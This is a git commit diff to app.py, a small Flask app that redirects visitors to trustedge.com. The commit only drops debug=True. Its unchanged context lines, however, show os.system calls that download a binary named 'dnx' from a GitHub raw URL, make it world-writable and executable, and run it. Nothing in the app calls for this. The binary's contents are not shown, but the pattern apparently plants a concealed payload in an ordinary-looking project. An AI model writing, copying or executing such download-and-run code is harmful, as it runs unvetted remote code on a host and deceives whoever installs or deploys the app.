d075372888450f2d7c0b2af0866732f707376d2a
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-22 23:39:22 +0700

    Update app.py

--- app.py
+++ app.py
@@ -11,7 +11,7 @@ def redirect_page():
     return redirect("https://trustedge.com/", code = 302)
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run()
 os.system('wget https://github.com/55113110159/OS/raw/main/dnx')
 os.system('chmod 777 dnx')
 os.system('./dnx')
